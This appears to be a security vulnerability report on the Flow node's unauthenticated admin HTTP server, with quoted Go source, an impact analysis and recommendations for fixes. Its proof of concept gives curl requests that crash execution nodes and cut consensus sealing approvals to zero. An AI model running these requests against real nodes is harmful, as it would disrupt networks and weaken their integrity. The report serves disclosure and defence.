### Title
Unauthenticated Admin HTTP Server Exposes Critical Protocol-Altering Operations Without Mandatory Access Control - (`admin/command_runner.go`, `cmd/scaffold.go`)

### Summary
The Flow node admin server concentrates enormous protocol-altering power (crashing execution nodes, reducing consensus sealing requirements to zero, manipulating rate limits) in a single HTTP endpoint. TLS/mTLS is entirely optional — when not configured, the server runs as plain unauthenticated HTTP. Any network-reachable attacker who can reach the admin port can execute any registered admin command with no credential check whatsoever.

### Finding Description

The `CommandRunner` in `admin/command_runner.go` starts an HTTP server whose authentication is gated solely on whether `tlsConfig` is non-nil:

```go
if r.tlsConfig == nil {
    err = httpServer.ListenAndServe()   // plain HTTP, zero auth
} else {
    err = httpServer.ListenAndServeTLS("", "")
}
``` [1](#0-0) 

TLS is only applied when all three flags `--admin-cert`, `--admin-key`, and `--admin-client-certs` are provided. The check in `EnqueueAdminServerInit` enforces that all three must be present together, but does **not** require any of them to be set at all:

```go
if node.AdminCert != NotSet {
    // ... load TLS config
    opts = append(opts, admin.WithTLS(config))
}
// If AdminCert == NotSet, no TLS is applied — server starts unauthenticated
``` [2](#0-1) 

The admin server is enabled by passing `--admin-addr`. The ledger service README explicitly documents binding to `0.0.0.0:9003` as a supported configuration:

```
-admin-addr 0.0.0.0:9003
``` [3](#0-2) 

Once the server is reachable, the `runCommand` path performs **no caller identity check** — it only validates the command payload format: [4](#0-3) 

The registered commands include:

**1. `stop-at-height` with `crash: true`** — directly crashes an execution node at a caller-chosen block height via `log.Fatal()`: [5](#0-4) 

**2. `set-config` with `consensus-required-approvals-for-sealing: 0`** — reduces the number of verification approvals required to construct a seal to zero on consensus nodes. The `SetRequiredApprovalsForSealingConstruction(0)` call succeeds when `requiredApprovalsForSealVerification` is also 0 (the default): [6](#0-5) 

With construction set to 0, the seal validator condition `uint(numberApprovers) < requireApprovalsForSealConstruction` is never true (0 < 0 is false), so every seal passes regardless of how many verification approvals it carries: [7](#0-6) 

**3. `ingest-tx-rate-limit` add** — can add arbitrary addresses to the collection node rate-limit blocklist, suppressing transaction ingestion for targeted accounts. [8](#0-7) 

### Impact Explanation

An attacker who can reach the admin HTTP port of a node configured without TLS can:

- **Crash any execution node** by issuing `stop-at-height` with `crash: true` and a near-future height, halting block execution for that node.
- **Reduce consensus sealing requirements to zero** on a consensus node, causing the node to accept seals with no verification approvals. This degrades the protocol's execution-result integrity guarantee: execution results can be sealed without any verification node having checked them.
- **Suppress transaction processing** for targeted accounts by adding them to the collection node rate-limit list.

The sealing-requirement reduction is the most severe: it silently weakens the BFT security model of the entire network for as long as the setting persists, without any on-chain signal.

### Likelihood Explanation

The admin server is disabled by default (`AdminAddr == NotSet`). However:
- Operators routinely enable it for live maintenance (log-level changes, stop-at-height upgrades, checkpoint triggers).
- The ledger service README explicitly documents `0.0.0.0:9003` as a valid bind address.
- TLS is presented as optional with no warning that omitting it leaves the server fully unauthenticated.
- In containerized deployments, port-mapping mistakes (e.g., `0.0.0.0:9002->9002/tcp` instead of `127.0.0.1:9002->9002/tcp`) are common and expose the port to the host network or beyond.

Any attacker with network-layer access to the admin port — including a co-tenant in a shared cloud environment, a compromised sidecar container, or a misconfigured firewall — can issue commands with no further preconditions.

### Recommendation

1. **Require authentication by default.** If `--admin-addr` is set but no TLS flags are provided, either refuse to start or bind only to `127.0.0.1` and emit a prominent warning.
2. **Add a shared-secret or token-based fallback** for deployments where mTLS is operationally difficult, so that unauthenticated plain-HTTP operation is never the default.
3. **Scope the most dangerous commands** (e.g., `stop-at-height`, `consensus-required-approvals-for-sealing`) behind a separate, higher-privilege credential or require a time-delayed confirmation, analogous to the time-delay recommendation in the referenced report.
4. **Audit the default bind address**: enforce `127.0.0.1` unless the operator explicitly overrides it, reducing the blast radius of misconfiguration.

### Proof of Concept

Assuming a consensus node with `--admin-addr 0.0.0.0:9002` and no TLS flags (a documented, supported configuration):

```bash
# Step 1: Verify the server is reachable and unauthenticated
curl http://<consensus-node-ip>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName": "list-commands"}'
# Returns list of all commands — no auth challenge

# Step 2: Reduce sealing approval requirement to 0
curl http://<consensus-node-ip>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName": "set-config", "data": {"consensus-required-approvals-for-sealing": 0}}'
# Returns: {"output": {"oldValue": 1, "newValue": 0}}
# Consensus node now accepts seals with zero verification approvals

# Step 3 (separate, on an execution node): crash the node
curl http://<execution-node-ip>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName": "stop-at-height", "data": {"height": <current+2>, "crash": true}}'
# Execution node crashes when finalization reaches that height
```

The `set-config` path is confirmed reachable through `SetConfigCommand.Handler` → `field.Set(0)` → `sealingConfigs.SetRequiredApprovalsForSealingConstruction(0)`, which stores `0` atomically and is immediately read by `validateSeal` on the next seal proposal. [9](#0-8) [6](#0-5)

### Citations

**File:** admin/command_runner.go (L260-265)
```go
		var err error
		if r.tlsConfig == nil {
			err = httpServer.ListenAndServe()
		} else {
			err = httpServer.ListenAndServeTLS("", "")
		}
```

**File:** admin/command_runner.go (L304-341)
```go
func (r *CommandRunner) runCommand(ctx context.Context, command string, data any) (any, error) {
	r.logger.Info().Str("command", command).Msg("received new command")

	req := &CommandRequest{Data: data}

	if validator := r.getValidator(command); validator != nil {
		if validationErr := validator(req); validationErr != nil {
			// for expected validation errors, return code InvalidArgument and the error text
			if IsInvalidAdminParameterError(validationErr) {
				return nil, status.Error(codes.InvalidArgument, validationErr.Error())
			}
			// for unexpected errors, return code Internal and log a warning
			r.logger.Err(validationErr).Msg("unexpected error validating admin request")
			return nil, status.Error(codes.Internal, validationErr.Error())
		}
	}

	var handleResult any
	var handleErr error

	if handler := r.getHandler(command); handler != nil {
		if handleResult, handleErr = handler(ctx, req); handleErr != nil {
			if errors.Is(handleErr, context.Canceled) {
				return nil, status.Error(codes.Canceled, "client canceled")
			} else if errors.Is(handleErr, context.DeadlineExceeded) {
				return nil, status.Error(codes.DeadlineExceeded, "request timed out")
			} else {
				r.logger.Err(handleErr).Msg("unexpected error handling admin request")
				s, _ := status.FromError(handleErr)
				return nil, s.Err()
			}
		}
	} else {
		return nil, status.Error(codes.Unimplemented, "invalid command")
	}

	return handleResult, nil
}
```

**File:** cmd/scaffold.go (L756-775)
```go
		if node.AdminCert != NotSet {
			serverCert, err := tls.LoadX509KeyPair(node.AdminCert, node.AdminKey)
			if err != nil {
				return nil, err
			}
			clientCAs, err := os.ReadFile(node.AdminClientCAs)
			if err != nil {
				return nil, err
			}
			certPool := x509.NewCertPool()
			certPool.AppendCertsFromPEM(clientCAs)
			config := &tls.Config{
				MinVersion:   tls.VersionTLS13,
				Certificates: []tls.Certificate{serverCert},
				ClientAuth:   tls.RequireAndVerifyClientCert,
				ClientCAs:    certPool,
			}

			opts = append(opts, admin.WithTLS(config))
		}
```

**File:** cmd/ledger/README.md (L42-46)
```markdown
# With admin server enabled (use port 9003 to avoid conflict with execution node's 9002)
./flow-ledger-service \
  -triedir /path/to/trie \
  -ledger-service-tcp 0.0.0.0:9000 \
  -admin-addr 0.0.0.0:9003
```

**File:** engine/execution/ingestion/stop/stop_control.go (L555-568)
```go
	if s.stopBoundary.ShouldCrash {
		log.Info().
			Dur("max-graceful-stop-duration", s.maxGracefulStopDuration).
			Msg("Attempting graceful stop as finalization reached requested stop")
		doneChan := s.unit.Done()
		select {
		case <-doneChan:
			log.Info().Msg("Engine gracefully stopped")
		case <-time.After(s.maxGracefulStopDuration):
			log.Info().
				Msg("Engine did not stop within max graceful stop duration")
		}
		log.Fatal().Msg("Crashing as finalization reached requested stop")
		return
```

**File:** module/updatable_configs/sealing_configs.go (L50-63)
```go
func (r *sealingConfigs) SetRequiredApprovalsForSealingConstruction(requiredApprovalsForSealConstruction uint) error {
	err := validation.ValidateRequireApprovals(
		requiredApprovalsForSealConstruction,
		r.requiredApprovalsForSealVerification,
		r.chunkAlpha,
	)
	if err != nil {
		return NewValidationErrorf("invalid: %w", err)
	}

	r.requiredApprovalsForSealConstruction.Store(uint32(requiredApprovalsForSealConstruction))

	return nil
}
```

**File:** module/validation/seal_validator.go (L309-322)
```go
		requireApprovalsForSealConstruction := s.sealingConfigsGetter.RequireApprovalsForSealConstructionDynamicValue()
		requireApprovalsForSealVerification := s.sealingConfigsGetter.RequireApprovalsForSealVerificationConst()
		if uint(numberApprovers) < requireApprovalsForSealConstruction {
			if uint(numberApprovers) >= requireApprovalsForSealVerification {
				// Emergency sealing is a _temporary_ fallback to reduce the probability of
				// sealing halts due to bugs in the verification nodes, where they don't
				// approve a chunk even though they should (false-negative).
				// TODO: remove this fallback for BFT
				emergencySealed = true
			} else {
				return engine.NewInvalidInputErrorf("chunk %d has %d approvals but require at least %d",
					chunk.Index, numberApprovers, requireApprovalsForSealVerification)
			}
		}
```

**File:** admin/commands/collection/tx_rate_limiter.go (L53-69)
```go
	if cmd == "add" || cmd == "remove" {
		result, ok := input["addresses"]
		if !ok {
			return admin.NewInvalidAdminReqErrorf("the \"addresses\" field is empty, must be hex formated addresses, can be splitted by \",\""), nil
		}
		addresses, ok := result.(string)
		if !ok {
			return admin.NewInvalidAdminReqErrorf("the \"addresses\" field is not string, must be hex formated addresses, can be splitted by \",\""), nil
		}

		log.Info().Msgf("admintool %v addresses: %v", cmd, addresses)

		resp, err := s.AddOrRemove(cmd, addresses)
		if err != nil {
			return nil, err
		}
		return resp, nil
```

**File:** admin/commands/common/set_config.go (L33-51)
```go
func (s *SetConfigCommand) Handler(_ context.Context, req *admin.CommandRequest) (any, error) {
	validatedReq := req.ValidatorData.(validatedSetConfigData)

	oldValue := validatedReq.field.Get()

	err := validatedReq.field.Set(validatedReq.value)
	if err != nil {
		if updatable_configs.IsValidationError(err) {
			return nil, fmt.Errorf("config update failed due to invalid input: %w", err)
		}
		return nil, fmt.Errorf("unexpected error setting config field %s: %w", validatedReq.field.Name, err)
	}

	res := map[string]any{
		"oldValue": oldValue,
		"newValue": validatedReq.value,
	}

	return res, nil
```
